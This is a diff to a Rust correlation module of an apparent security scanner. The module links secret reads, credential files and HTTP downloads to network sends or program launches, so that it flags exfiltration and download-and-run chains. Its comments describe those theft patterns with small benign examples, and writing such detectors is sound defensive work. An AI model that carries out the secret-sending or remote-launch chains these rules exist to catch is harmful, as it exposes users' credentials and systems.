@@ -24,18 +24,45 @@
 //! `Authorization` are where a key legitimately goes, and excluding them is
 //! what keeps every ordinary API client from lighting up.
 //!
-//! What counts as a use is the rule's `name_uses`. `"value"` (every built-in
-//! chain) reads the name with [`uses_word`]: a keyword argument's name, an
-//! assignment target or an object key that only repeats the bound name is not
-//! a use of it. With `url = os.environ["DATABASE_URL"]` bound above
-//! `requests.get(url=base + "/ping")`, the call sends `base + "/ping"`, and
-//! `json={"token": "x"}` beside a bound `token` sends `"x"`; `data=token`,
-//! `json={"k": token}`, `f"...{token}"`, `token=token` and `{ token }` do send
-//! it. `"word"` reads it with [`contains_word`], any whole-word occurrence,
+//! What counts as a use is the rule's `name_uses`. `"word"` reads the name
+//! with [`contains_word`], any whole-word occurrence in the argument window,
 //! which is how the chains without a statement window linked before the
 //! field existed, and how a rule that leaves `name_uses` unset still links
-//! outside the statement mode. Two f-string forms that do send the value read
-//! as a name, and do not link by value: `f"{token=}"` and `f"{token:>40}"`.
+//! outside the statement mode. `"value"` (every built-in chain) links only
+//! where the sink sends the bound value (see [`uses_value`]):
+//!
+//! - **Code, not text.** The window is read with its comments and the
+//!   contents of its string literals blanked, by the sink file's language
+//!   ([`code_only`]); what a string interpolates stays (`f"...{token:>40}"`,
+//!   `f"{token=}"`, `` `${token}` ``, `"$TOKEN"`, `"${TOKEN:-}"`, a
+//!   `locals()`-formatted `"{token}"`). A token endpoint's path or a
+//!   `# no token here` note is not the token.
+//! - **Values, not names.** A keyword argument's name, an assignment target,
+//!   an object key (`url=base + "/ping"`, `json={"token": "x"}`, `{ token:
+//!   "public" }`), a TypeScript member (`token?: string`), an attribute of
+//!   another object (`r.url`), a destructuring target or an export list is
+//!   not a use; `data=token`, `json={"k": token}`, `token=token`, `{ token }`,
+//!   a Python dict whose key *is* the variable (`{token: 1}`) and a ternary
+//!   operand are. A count (`len(secrets)`, `secrets.split("\n").length`) is
+//!   a number, not the value.
+//! - **The sink's own call.** Outside the statement mode the window is the
+//!   sink line and the lines its call continues onto ([`call_scope`]), not
+//!   the next function or a log line after it. A sink that names a
+//!   destination without sending (a webhook URL, a socket) adds the lines
+//!   that use the name it assigns.
+//! - **The bound value, not a parameter.** In the body of a function declared
+//!   after the source with a parameter of the same name (`def ping(url):`),
+//!   the name is that parameter ([`shadowed_from`]), unless the function is
+//!   called with the bound value.
+//! - **One more hop, where the word reading linked.** A name assigned from
+//!   the bound one between the source and the send (`encoded =
+//!   urlencode(data)`) is followed when the word reading's window names the
+//!   bound name in its code (`Request(url, data=encoded)` beside a bound
+//!   `data`), so the value reading makes no link the word reading did not
+//!   ([`derived_names`]).
+//! - **A same-line link is code.** A source and sink on one line (or one
+//!   call) link unless one of them matched only the line's comment
+//!   ([`apply_matching`]).
 //!
 //! A rule may also set `sink_window_before`, which makes the window the
 //! sink's *statement* (see [`statement_scope`]). That is for sinks matched on
@@ -61,7 +88,10 @@
 //! reads names as values.
 //!
 //! A rule may set `max_line_length`: a source or sink on a longer line is not
-//! linked, because on a minified bundle one line holds a whole program.
+//! linked, because on a minified bundle one line holds a whole program. A
+//! rule that reads names as values does not link in a `.map` file at all: a
+//! source map holds other files' source as JSON string data, one line of it
+//! megabytes long, and none of it runs.
 //!
 //! A line binds a name by assigning to it (`key = os.getenv(...)`), by the
 //! `as` name of a `with` item that *yields* data (`with open(KEY_PATH) as
@@ -85,9 +115,11 @@
 //!   the handle would report that as the credential file reaching the send.
 //! - a sink that *runs a file* (behaviour `executes_program`: an interpreter
 //!   on a path, `Start-Process`, `os.startfile`) is linked only through a file
-//!   the source line wrote, named on the launch line itself. What an HTTP call
-//!   assigns (`data = client.get(u).json()`) and then hands to a local script
-//!   as input is an argument to that script, not the program that runs.
+//!   the source line wrote, named on the launch line itself — read by value,
+//!   as the program the launch runs ([`launched_operands`]), not a data file
+//!   handed to it, its `cwd=` or a comment. What an HTTP call assigns (`data
+//!   = client.get(u).json()`) and then hands to a local script as input is
+//!   an argument to that script, not the program that runs.
 //!
 //! Correlation reads rule ids, never severities: a Low observation (an HTTP
 //! client call, a subprocess launch, an environment read) is as good a source
@@ -353,7 +385,9 @@ fn is_ident_byte(b: u8) -> bool {
 /// Is `name` an identifier (as opposed to a literal path a line writes)?
 fn is_identifier(name: &str) -> bool {
     let b = name.as_bytes();
-    b.first().is_some_and(|c| c.is_ascii_alphabetic() || *c == b'_') && b.iter().all(|&c| is_ident_byte(c))
+    b.first()
+        .is_some_and(|c| c.is_ascii_alphabetic() || *c == b'_')
+        && b.iter().all(|&c| is_ident_byte(c))
 }
 
 /// The start offsets of the whole-word occurrences of `ident` in `text`.
@@ -400,14 +434,23 @@ fn occurrences<'a>(text: &'a str, ident: &'a str) -> impl Iterator<Item = usize>
 /// variable reference, `$TOKEN` or `${TOKEN:-default}`.
 fn uses_word(text: &str, ident: &str) -> bool {
     let bytes = text.as_bytes();
-    occurrences(text, ident).any(|at| !names_a_parameter(bytes, at, at + ident.len(), Lang::Other))
+    occurrences(text, ident)
+        .any(|at| !names_a_parameter(bytes, at, at + ident.len(), Lang::Other, &mut || None))
 }
 
 /// Is the word at `bytes[at..end]` a keyword-argument name, an assignment
 /// target or an object key (see [`uses_word`])? `lang` is the sink file's:
 /// in Python a bare `name:` inside `{...}` is a dict key *expression*, which
-/// is the variable's value, not a name.
-fn names_a_parameter(bytes: &[u8], at: usize, end: usize, lang: Lang) -> bool {
+/// is the variable's value, not a name. `innermost` says which bracket is
+/// open at `at` (see [`OpenBrackets`]); it is asked only for that Python
+/// case.
+fn names_a_parameter(
+    bytes: &[u8],
+    at: usize,
+    end: usize,
+    lang: Lang,
+    innermost: &mut dyn FnMut() -> Option<u8>,
+) -> bool {
     let is_blank = |b: u8| b == b' ' || b == b'\t';
     // A variable reference reads the variable: `${TOKEN:-}`, `${TOKEN=x}`
     // and `"$TOKEN=1"` send it. Only `$name = ...` opening a line (PHP,
@@ -439,7 +482,7 @@ fn names_a_parameter(bytes: &[u8], at: usize, end: usize, lang: Lang) -> bool {
         }
         Some(b':') if after != Some(b':') && !dollar => {
             let start = if quote.is_some() { at - 1 } else { at };
-            in_key_position(bytes, start, lang, quote.is_none())
+            in_key_position(bytes, start, lang, quote.is_none(), innermost)
         }
         _ => false,
     }
@@ -457,13 +500,19 @@ fn starts_its_line(bytes: &[u8], i: usize) -> bool {
 /// Is a `name:` whose name (or opening quote) starts at `start` a key: after
 /// `{`, `,`, `(` or `;`, at the start of the text or of a line, or after a
 /// TypeScript member modifier?
-fn in_key_position(bytes: &[u8], start: usize, lang: Lang, bare: bool) -> bool {
+fn in_key_position(
+    bytes: &[u8],
+    start: usize,
+    lang: Lang,
+    bare: bool,
+    innermost: &mut dyn FnMut() -> Option<u8>,
+) -> bool {
     let mut i = start;
     while i > 0 && (bytes[i - 1] == b' ' || bytes[i - 1] == b'\t') {
         i -= 1;
     }
     // `{token: "host"}` in Python sends the variable's value as the key.
-    let python_dict = || bare && lang == Lang::Python && innermost_open(bytes, start) == Some(b'{');
+    let mut python_dict = || bare && lang == Lang::Python && innermost() == Some(b'{');
     if i == 0 {
         return !python_dict();
     }
@@ -477,7 +526,7 @@ fn in_key_position(bytes: &[u8], start: usize, lang: Lang, bare: bool) -> bool {
             while k > 0 && bytes[k - 1].is_ascii_whitespace() {
                 k -= 1;
             }
-            !(k > 0 && bytes[k - 1] == b'?') && !python_dict()
+            (k == 0 || bytes[k - 1] != b'?') && !python_dict()
         }
         _ => {
             let mut k = i;
@@ -499,22 +548,34 @@ fn in_key_position(bytes: &[u8], start: usize, lang: Lang, bare: bool) -> bool {
     }
 }
 
-/// The innermost bracket still open at `at`, reading `bytes` from the start.
-fn innermost_open(bytes: &[u8], at: usize) -> Option<u8> {
-    let mut depth = 0usize;
-    for &b in bytes[..at].iter().rev() {
-        match b {
-            b')' | b']' | b'}' => depth += 1,
-            b'(' | b'[' | b'{' => {
-                if depth == 0 {
-                    return Some(b);
-                }
-                depth -= 1;
-            }
-            _ => {}
+/// The bracket still open at an offset of one text, for offsets asked in
+/// increasing order: each call reads only the bytes since the last one, so
+/// asking at every occurrence of a name on a long line stays linear.
+/// An unmatched closing bracket closes whatever is open, the same answer a
+/// scan backwards from the offset gives.
+#[derive(Default)]
+struct OpenBrackets {
+    pos: usize,
+    stack: Vec<u8>,
+}
+
+impl OpenBrackets {
+    fn innermost(&mut self, bytes: &[u8], at: usize) -> Option<u8> {
+        if at < self.pos {
+            *self = OpenBrackets::default();
         }
+        for &b in &bytes[self.pos..at] {
+            match b {
+                b'(' | b'[' | b'{' => self.stack.push(b),
+                b')' | b']' | b'}' => {
+                    self.stack.pop();
+                }
+                _ => {}
+            }
+        }
+        self.pos = at;
+        self.stack.last().copied()
     }
-    None
 }
 
 /// Does `ident` appear in `code` as a value the sink's statement sends: the
@@ -534,14 +595,151 @@ fn innermost_open(bytes: &[u8], at: usize) -> Option<u8> {
 /// - on a line that only exports names (`export { token }`,
 ///   `module.exports = { token, health }`).
 fn uses_value(code: &str, ident: &str, lang: Lang, recv: Option<&str>) -> bool {
-    let bytes = code.as_bytes();
-    occurrences(code, ident).any(|at| {
-        !names_a_parameter(bytes, at, at + ident.len(), lang)
-            && !an_attribute_of_another_object(bytes, at, recv)
-            && !in_an_assignment_pattern(bytes, at)
-            && !on_an_export_line(code, at)
-    })
+    uses_value_before(code, ident, lang, recv, code.len())
 }
+
+/// [`uses_value`], counting only the occurrences that start before `limit`:
+/// from there on the name is a function's parameter (see [`shadowed_from`]).
+///
+/// Linear in the length of `code`, however often `ident` repeats in it: the
+/// open bracket and each line's facts are worked out once, as the
+/// occurrences are read in order.
+fn uses_value_before(
+    code: &str,
+    ident: &str,
+    lang: Lang,
+    recv: Option<&str>,
+    limit: usize,
+) -> bool {
+    let bytes = code.as_bytes();
+    let mut open = OpenBrackets::default();
+    let mut line = LineFacts::default();
+    occurrences(code, ident)
+        .take_while(|&at| at < limit)
+        .any(|at| {
+            // The line's facts first: they ask for the bracket open at the
+            // line's start, which is before `at`.
+            !line.excludes(code, at, &mut open)
+                && !names_a_parameter(bytes, at, at + ident.len(), lang, &mut || {
+                    open.innermost(bytes, at)
+                })
+                && !an_attribute_of_another_object(bytes, at, recv)
+                && !only_counted(bytes, at, at + ident.len())
+        })
+}
+
+/// What a line says about the names on it, worked out once per line by
+/// [`uses_value_before`]: the target of a destructuring or tuple assignment
+/// the line makes, and whether it only exports names.
+#[derive(Default)]
+struct LineFacts {
+    /// The line, as a byte range of the text; `None` before the first ask.
+    range: Option<std::ops::Range<usize>>,
+    /// The assignment target, as a byte range of the text.
+    target: Option<std::ops::Range<usize>>,
+    export: bool,
+}
+
+impl LineFacts {
+    /// Is the occurrence at `at` in an assignment pattern, or on an export
+    /// line? A line that starts inside an open bracket continues a call or
+    /// a literal (`requests.post(url,` / `    token, timeout=5)`), and
+    /// assigns nothing.
+    fn excludes(&mut self, code: &str, at: usize, open: &mut OpenBrackets) -> bool {
+        if !self.range.as_ref().is_some_and(|r| r.contains(&at)) {
+            let bytes = code.as_bytes();
+            let range = line_around(bytes, at);
+            let continues = open.innermost(bytes, range.start).is_some();
+            self.target = assignment_pattern(&bytes[range.clone()])
+                .filter(|_| !continues)
+                .map(|t| range.start + t.start..range.start + t.end);
+            self.export = code
+                .get(range.clone())
+                .is_some_and(|l| export_list_re().is_match(l));
+            self.range = Some(range);
+        }
+        self.export || self.target.as_ref().is_some_and(|t| t.contains(&at))
+    }
+}
+
+/// How far [`only_counted`] reads the member chain after a name: a longer
+/// one is read as a use, which keeps a long line of them linear.
+const MAX_CHAIN: usize = 256;
+
+/// Is the occurrence at `bytes[at..end]` only counted: the argument of
+/// `len(...)` (`len(secrets)`, `len(secrets.splitlines())`), or the head of
+/// a member chain that ends in `.length`, `.size` or `.count(...)`
+/// (`secrets.split("\n").length`)? A count of a secret's lines is a number,
+/// not the secret.
+fn only_counted(bytes: &[u8], at: usize, end: usize) -> bool {
+    // The member chain after the name: `.name` steps and bracketed groups.
+    let mut j = end;
+    let mut last: &[u8] = b"";
+    let mut last_called = false;
+    while j < bytes.len() && j - end <= MAX_CHAIN {
+        match bytes[j] {
+            b'.' => {
+                let s = j + 1;
+                let mut k = s;
+                while k < bytes.len() && is_ident_byte(bytes[k]) {
+                    k += 1;
+                }
+                if k == s {
+                    break;
+                }
+                last = &bytes[s..k];
+                last_called = false;
+                j = k;
+            }
+            b'(' | b'[' => {
+                let mut depth = 0usize;
+                let mut k = j;
+                while k < bytes.len() && k - end <= MAX_CHAIN {
+                    match bytes[k] {
+                        b'(' | b'[' | b'{' => depth += 1,
+                        b')' | b']' | b'}' => {
+                            depth -= 1;
+                            if depth == 0 {
+                                break;
+                            }
+                        }
+                        _ => {}
+                    }
+                    k += 1;
+                }
+                if depth != 0 {
+                    return false;
+                }
+                last_called = bytes[j] == b'(';
+                j = k + 1;
+            }
+            _ => break,
+        }
+    }
+    if j - end > MAX_CHAIN {
+        return false;
+    }
+    let mut i = at;
+    while i > 0 && (bytes[i - 1] == b' ' || bytes[i - 1] == b'\t') {
+        i -= 1;
+    }
+    let mut k = j;
+    while k < bytes.len() && (bytes[k] == b' ' || bytes[k] == b'\t') {
+        k += 1;
+    }
+    let in_len = i >= 4
+        && &bytes[i - 4..i] == b"len("
+        && (i == 4 || !is_ident_byte(bytes[i - 5]))
+        && bytes.get(k) == Some(&b')');
+    in_len
+        || (matches!(last, b"length" | b"size") && !last_called)
+        || (last == b"count" && last_called)
+}
+
+/// The receiver path [`an_attribute_of_another_object`] reads back over is
+/// at most this long; a longer run of dotted names is not `self`, `this` or
+/// the source's own receiver, and stopping keeps a long line of them linear.
+const MAX_RECEIVER: usize = 256;
 
 /// Is the occurrence at `at` an attribute of an object other than the one
 /// the name was bound on (see [`uses_value`])?
@@ -550,7 +748,7 @@ fn an_attribute_of_another_object(bytes: &[u8], at: usize, recv: Option<&str>) -
         return false;
     }
     let mut k = at - 1;
-    while k > 0 && (is_ident_byte(bytes[k - 1]) || bytes[k - 1] == b'.') {
+    while k > 0 && at - k <= MAX_RECEIVER && (is_ident_byte(bytes[k - 1]) || bytes[k - 1] == b'.') {
         k -= 1;
     }
     let path = &bytes[k..at - 1];
@@ -565,17 +763,21 @@ fn an_attribute_of_another_object(bytes: &[u8], at: usize, recv: Option<&str>) -
 
 /// The line of `bytes` that holds offset `at`, as a byte range.
 fn line_around(bytes: &[u8], at: usize) -> std::ops::Range<usize> {
-    let start = bytes[..at].iter().rposition(|&b| b == b'\n').map_or(0, |p| p + 1);
-    let end = bytes[at..].iter().position(|&b| b == b'\n').map_or(bytes.len(), |p| at + p);
+    let start = bytes[..at]
+        .iter()
+        .rposition(|&b| b == b'\n')
+        .map_or(0, |p| p + 1);
+    let end = bytes[at..]
+        .iter()
+        .position(|&b| b == b'\n')
+        .map_or(bytes.len(), |p| at + p);
     start..end
 }
 
-/// Is the occurrence at `at` inside the target of a destructuring or tuple
-/// assignment on its line: a `{...}`, `[...]` or `(...)` pattern, or names
-/// joined by commas, before the line's first `=` (see [`uses_value`])?
-fn in_an_assignment_pattern(bytes: &[u8], at: usize) -> bool {
-    let range = line_around(bytes, at);
-    let line = &bytes[range.clone()];
+/// The target of a destructuring or tuple assignment `line` makes, as a
+/// byte range of the line: a `{...}`, `[...]` or `(...)` pattern, or names
+/// joined by commas, before the line's first `=` (see [`uses_value`]).
+fn assignment_pattern(line: &[u8]) -> Option<std::ops::Range<usize>> {
     let mut p = 0;
     loop {
         while p < line.len() && (line[p] == b' ' || line[p] == b'\t') {
@@ -598,39 +800,34 @@ fn in_an_assignment_pattern(bytes: &[u8], at: usize) -> bool {
         match b {
             b'=' => {
                 let next = line.get(p + 1).copied();
-                let assigns = next != Some(b'=')
-                    && next != Some(b'>')
-                    && !b"!<>+-*/%&|^:".contains(&prev);
-                let off = at - range.start;
-                return assigns && (bracketed || comma) && (start..p).contains(&off);
+                let assigns =
+                    next != Some(b'=') && next != Some(b'>') && !b"!<>+-*/%&|^:".contains(&prev);
+                return (assigns && (bracketed || comma)).then_some(start..p);
             }
             b',' => comma = true,
             // `send(url, token=...)` is a call, not a pattern.
-            b'(' if is_ident_byte(prev) => return false,
+            b'(' if is_ident_byte(prev) => return None,
             _ if is_ident_byte(b) || b" \t{}[]():.*$".contains(&b) => {}
-            _ => return false,
+            _ => return None,
         }
         if b != b' ' && b != b'\t' {
             prev = b;
         }
         p += 1;
     }
-    false
+    None
 }
 
+/// A line that exports a list of names: `export { token }`,
+/// `module.exports = { token, health };`.
 fn export_list_re() -> &'static Regex {
     static RE: OnceLock<Regex> = OnceLock::new();
     RE.get_or_init(|| {
-        Regex::new(r"^\s*(?:export\s+(?:default\s+)?|module\.exports\s*=\s*)\{[\s\w$,:]*\}\s*;?\s*$")
-            .expect("export-list regex compiles")
+        Regex::new(
+            r"^\s*(?:export\s+(?:default\s+)?|module\.exports\s*=\s*)\{[\s\w$,:]*\}\s*;?\s*$",
+        )
+        .expect("export-list regex compiles")
     })
-}
-
-/// Is the occurrence at `at` on a line that exports a list of names
-/// (`export { token }`, `module.exports = { token, health };`)?
-fn on_an_export_line(code: &str, at: usize) -> bool {
-    let range = line_around(code.as_bytes(), at);
-    code.get(range).is_some_and(|l| export_list_re().is_match(l))
 }
 
 /// How [`code_only`] tells code from comments and strings in a file, chosen
@@ -693,6 +890,19 @@ impl Lang {
 /// does not carry over to the next line, except in a triple-quoted string
 /// or a JavaScript template.
 fn code_only(text: &str, lang: Lang) -> String {
+    blank(text, lang, true)
+}
+
+/// `text` with its comments blanked and its strings kept: what a rule that
+/// matched the line would still match if the line had no comment. Same
+/// length as `text`, byte for byte.
+fn without_comments(text: &str, lang: Lang) -> String {
+    blank(text, lang, false)
+}
+
+/// Blank the comments of `text`, and, with `strings`, the contents of its
+/// string literals (see [`code_only`]).
+fn blank(text: &str, lang: Lang, strings: bool) -> String {
     if lang == Lang::Other {
         return text.to_string();
     }
@@ -704,13 +914,24 @@ fn code_only(text: &str, lang: Lang) -> String {
     let mut i = 0;
     while i < b.len() {
         if let Some(end) = comment_end(b, i, lang) {
-            out.extend(b[i..end].iter().map(|&c| if c == b'\n' { b'\n' } else { b' ' }));
+            out.extend(
+                b[i..end]
+                    .iter()
+                    .map(|&c| if c == b'\n' { b'\n' } else { b' ' }),
+            );
             i = end;
             continue;
         }
         if let Some(open) = string_open(b, i, lang) {
             out.extend_from_slice(&b[i..open.body]);
-            i = mask_string(b, &open, placeholders, &mut out);
+            let body = out.len();
+            // `mask_string` writes one byte for each byte it reads.
+            let end = mask_string(b, &open, placeholders, &mut out);
+            if !strings {
+                out.truncate(body);
+                out.extend_from_slice(&b[open.body..end]);
+            }
+            i = end;
             continue;
         }
         out.push(b[i]);
@@ -722,7 +943,12 @@ fn code_only(text: &str, lang: Lang) -> String {
 /// Where the comment starting at `i` ends, if one starts there.
 fn comment_end(b: &[u8], i: usize, lang: Lang) -> Option<usize> {
     let after_blank = i == 0 || b[i - 1].is_ascii_whitespace();
-    let eol = || b[i..].iter().position(|&c| c == b'\n').map_or(b.len(), |p| i + p);
+    let eol = || {
+        b[i..]
+            .iter()
+            .position(|&c| c == b'\n')
+            .map_or(b.len(), |p| i + p)
+    };
     let hash = match lang {
         Lang::Python => true,
         Lang::Hash | Lang::Php | Lang::Prose => after_blank,
@@ -836,7 +1062,8 @@ fn mask_string(b: &[u8], open: &StringOpen, placeholders: bool, out: &mut Vec<u8
                     i += 1;
                     while i < b.len()
                         && (is_ident_byte(b[i])
-                            || (b[i] == b':' && b.get(i + 1).is_some_and(|&y| y.is_ascii_alphabetic())))
+                            || (b[i] == b':'
+                                && b.get(i + 1).is_some_and(|&y| y.is_ascii_alphabetic())))
                     {
                         out.push(b[i]);
                         i += 1;
@@ -852,7 +1079,10 @@ fn mask_string(b: &[u8], open: &StringOpen, placeholders: bool, out: &mut Vec<u8
                 i += 2;
                 continue;
             }
-            if open.fstring || b.get(i + 1).is_some_and(|&x| x.is_ascii_alphabetic() || x == b'_') {
+            if open.fstring
+                || b.get(i + 1)
+                    .is_some_and(|&x| x.is_ascii_alphabetic() || x == b'_')
+            {
                 i = copy_field(b, i, out);
                 continue;
             }
@@ -969,12 +1199,37 @@ fn copy_field(b: &[u8], i: usize, out: &mut Vec<u8>) -> usize {
     j
 }
 
+/// Run the active corpus's correlation rules over one file's findings, as
+/// the scanner does: with the corpus's own patterns to tell a finding that
+/// matched only a line's comment (see [`apply_matching`]).
+pub fn apply_corpus(findings: &[Finding], lines: &[&str]) -> Vec<Finding> {
+    let corpus = crate::corpus::compiled::corpus();
+    apply_matching(&corpus.correlation_rules, findings, lines, &|id, text| {
+        corpus.rule_matches(id, text)
+    })
+}
+
 /// Run every correlation rule over one file's findings.
 ///
 /// `lines` are the file's lines (already normalised for matching), used to
 /// read the source assignment and the sink argument window. Returns only the
 /// new chain findings; the caller appends them.
+#[cfg_attr(not(test), allow(dead_code))]
 pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) -> Vec<Finding> {
+    apply_matching(rules, findings, lines, &|_, _| None)
+}
+
+/// [`apply`], with `matches(rule_id, text)` saying whether a content rule's
+/// pattern matches a text (`None`: no pattern to ask). A rule that reads
+/// names as values links a source and a sink on one line (or one call) only
+/// when neither matched only the line's comment: `curl https://status.example
+/// # MCP_TOKEN stays local` is a request with a note beside it.
+pub fn apply_matching(
+    rules: &[CorrelationRule],
+    findings: &[Finding],
+    lines: &[&str],
+    matches: &dyn Fn(&str, &str) -> Option<bool>,
+) -> Vec<Finding> {
     let mut out: Vec<Finding> = Vec::new();
     if rules.is_empty() || findings.len() < 2 {
         return out;
@@ -982,6 +1237,14 @@ pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) ->
     // The findings are one file's: its extension says what the value reading
     // counts as code.
     let code = CodeLines::new(lines, Lang::of(&findings[0].file));
+    // Did this finding match only its line's comment?
+    let in_a_comment = |f: &Finding| -> bool {
+        let Some(line) = lines.get(f.line.unwrap_or(0).wrapping_sub(1)).copied() else {
+            return false;
+        };
+        matches(&f.rule, line) == Some(true)
+            && matches(&f.rule, &without_comments(line, code.lang)) == Some(false)
+    };
 
     for rule in rules {
         let Some(phase) = Phase::from_name(&rule.phase) else {
@@ -1077,15 +1340,29 @@ pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) ->
                 // Any other source is linked through a name it binds that
                 // the window uses.
                 let linked = if source_line == sink_line || in_same_call {
-                    true
+                    // Read by value, the line (or call) is the link only if
+                    // what matched there is code, not a note beside it.
+                    !by_value
+                        || !(in_a_comment(source)
+                            || (source_line == sink_line && in_a_comment(sink)))
                 } else if let Some(l) = lines.get(source_line.wrapping_sub(1)).copied() {
                     if file_only {
                         let written = written_paths(l);
                         if by_value {
-                            // Only through the program the launch runs.
-                            written
-                                .iter()
-                                .any(|p| launched().iter().any(|op| contains_word(op, p)))
+                            // Only through the program the launch runs; a
+                            // launch whose program operand is not one of the
+                            // shapes [`launched_operands`] reads is read by
+                            // value on its whole line.
+                            let ops = launched();
+                            written.iter().any(|p| {
+                                if !ops.is_empty() {
+                                    ops.iter().any(|op| contains_word(op, p))
+                                } else if is_identifier(p) {
+                                    uses_value(code.code(sink_line), p, code.lang, None)
+                                } else {
+                                    contains_word(launch_line, p)
+                                }
+                            })
                         } else {
                             written.iter().any(|p| contains_word(launch_line, p))
                         }
@@ -1093,32 +1370,61 @@ pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) ->
                         let bound = source_bindings(l);
                         if by_value {
                             let assigned = assignment(l);
+                            let (raw, masked, last) = value_text();
+                            // Where a parameter of the same name, of a
+                            // function the sink is in, takes over from the
+                            // bound value (see [`shadowed_from`]; the window
+                            // starts at the sink line outside the statement
+                            // mode).
+                            let limit = |name: &str, len: usize| {
+                                if statement_mode {
+                                    len
+                                } else {
+                                    shadowed_from(
+                                        &code,
+                                        source_line,
+                                        sink_line,
+                                        name,
+                                        rule.window_lines,
+                                    )
+                                    .map_or(len, |at| at.min(len))
+                                }
+                            };
                             // A call's keyword names and keys are not values
                             // it sends (`name_uses`).
-                            let reads = |raw: &str, masked: &str, name: &str| {
+                            let reads = |name: &str| {
                                 if is_identifier(name) {
                                     let recv = assigned
                                         .as_ref()
                                         .filter(|a| a.name == name)
                                         .and_then(|a| a.recv);
-                                    uses_value(masked, name, code.lang, recv)
+                                    uses_value_before(
+                                        masked,
+                                        name,
+                                        code.lang,
+                                        recv,
+                                        limit(name, masked.len()),
+                                    )
                                 } else {
                                     contains_word(raw, name)
                                 }
                             };
-                            let (raw, masked, last) = value_text();
-                            bound.iter().any(|b| reads(raw, masked, b))
+                            bound.iter().any(|b| reads(b))
                                 // Outside the statement mode, a name assigned
                                 // from the bound one before the send, where
                                 // the word reading's window names the bound
-                                // one in its code.
+                                // one in its code (and not as the parameter
+                                // of a function the sink is in).
                                 || (!statement_mode
-                                    && bound
-                                        .iter()
-                                        .any(|b| is_identifier(b) && contains_word(window_code(), b))
+                                    && bound.iter().any(|b| {
+                                        let w = window_code();
+                                        is_identifier(b) && contains_word(prefix(w, limit(b, w.len())), b)
+                                    })
                                     && derived_names(&code, source_line, *last, &bound)
                                         .iter()
-                                        .any(|d| uses_value(masked, d, code.lang, None)))
+                                        .any(|d| {
+                                            uses_value_before(masked, d, code.lang, None, limit(d, masked.len()))
+                                        }))
                         } else {
                             bound.iter().any(|b| contains_word(window, b))
                         }
@@ -1212,7 +1518,10 @@ impl<'a> CodeLines<'a> {
 
     /// 1-based line `n` as code; empty outside the file.
     fn code(&self, n: usize) -> &str {
-        match (self.lines.get(n.wrapping_sub(1)), self.code.get(n.wrapping_sub(1))) {
+        match (
+            self.lines.get(n.wrapping_sub(1)),
+            self.code.get(n.wrapping_sub(1)),
+        ) {
             (Some(line), Some(cell)) => cell.get_or_init(|| code_only(line, self.lang)),
             _ => "",
         }
@@ -1329,6 +1638,296 @@ fn derived_names<'a>(
     derived
 }
 
+/// A function header that declares parameters, in Python or the C family:
+/// `def ping(url):`, `lambda url:`, `function f(token) {`, `(token: string)
+/// =>`, `token =>`, `call(path: string, token?: string) {`. `name` is the
+/// function's name where the header gives one (`ping = lambda url: ...`,
+/// `const f = (token) => ...`); `params` its parameter list; `body` the
+/// offset where its parameters end and its body starts.
+struct Header<'a> {
+    name: Option<&'a str>,
+    params: &'a str,
+    start: usize,
+    body: usize,
+    /// Python's `def`, whose body is the lines indented under it; otherwise
+    /// a brace-delimited body, or an expression on the header's line.
+    indented: bool,
+}
+
+fn py_header_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| {
+        Regex::new(concat!(
+            r"^(?P<def>\s*(?:async\s+)?def\s+(?P<dname>[A-Za-z_]\w*)\s*\()(?P<dparams>[^)\n]*)\)[^:\n]*:",
+            r"|(?:\b(?P<lname>[A-Za-z_]\w*)\s*=\s*)?\blambda\b(?P<lparams>[^:\n]*):",
+        ))
+        .expect("python header regex compiles")
+    })
+}
+
+fn js_header_re() -> &'static Regex {
+    static RE: OnceLock<Regex> = OnceLock::new();
+    RE.get_or_init(|| {
+        Regex::new(concat!(
+            r"\bfunction\b\s*\*?\s*(?P<fname>[A-Za-z_$][\w$]*)?\s*\((?P<fparams>[^)\n]*)\)",
+            r"|(?:\b(?P<aname>[A-Za-z_$][\w$]*)\s*=\s*)?(?:\basync\s*)?\((?P<aparams>[^()\n]*)\)\s*(?::\s*[^=;{}()\n]*)?=>",
+            r"|(?:\b(?P<sname>[A-Za-z_$][\w$]*)\s*=\s*)?(?:\basync\s+)?\b(?P<sparam>[A-Za-z_$][\w$]*)\s*=>",
+            r"|^\s*(?:(?:public|private|protected|static|async|override|readonly|get|set)\s+)*(?P<mname>[A-Za-z_$][\w$]*)\s*\((?P<mparams>[^)\n]*)\)\s*(?::\s*[^{;=\n]*)?\{",
+        ))
+        .expect("js header regex compiles")
+    })
+}
+
+/// The function headers on one line of code (strings and comments blanked).
+fn headers(code: &str, lang: Lang) -> Vec<Header<'_>> {
+    let mut out = Vec::new();
+    match lang {
+        Lang::Python => {
+            for c in py_header_re().captures_iter(code) {
+                let whole = c.get(0).map_or(0..0, |m| m.range());
+                let (name, params, indented) = match (c.name("dparams"), c.name("lparams")) {
+                    (Some(p), _) => (c.name("dname"), p, true),
+                    (None, Some(p)) => (c.name("lname"), p, false),
+                    _ => continue,
+                };
+                out.push(Header {
+                    name: name.map(|m| m.as_str()),
+                    params: params.as_str(),
+                    start: params.start(),
+                    body: whole.end,
+                    indented,
+                });
+            }
+        }
+        Lang::CLike => {
+            for c in js_header_re().captures_iter(code) {
+                let whole = c.get(0).map_or(0..0, |m| m.range());
+                let (name, params) = if let Some(p) = c.name("fparams") {
+                    (c.name("fname"), p)
+                } else if let Some(p) = c.name("aparams") {
+                    (c.name("aname"), p)
+                } else if let Some(p) = c.name("sparam") {
+                    (c.name("sname"), p)
+                } else if let Some(p) = c.name("mparams") {
+                    let name = c.name("mname");
+                    // Control flow, not a method: `if (token) {`.
+                    if name.is_some_and(|n| {
+                        matches!(
+                            n.as_str(),
+                            "if" | "for"
+                                | "while"
+                                | "switch"
+                                | "catch"
+                                | "with"
+                                | "return"
+                                | "function"
+                        )
+                    }) {
+                        continue;
+                    }
+                    (name, p)
+                } else {
+                    continue;
+                };
+                // A method's match ends with the `{` that opens its body;
+                // the body starts at that brace.
+                let body = if c.name("mparams").is_some() {
+                    whole.end - 1
+                } else {
+                    whole.end
+                };
+                out.push(Header {
+                    name: name.map(|m| m.as_str()),
+                    params: params.as_str(),
+                    start: params.start(),
+                    body,
+                    indented: false,
+                });
+            }
+        }
+        _ => {}
+    }
+    out
+}
+
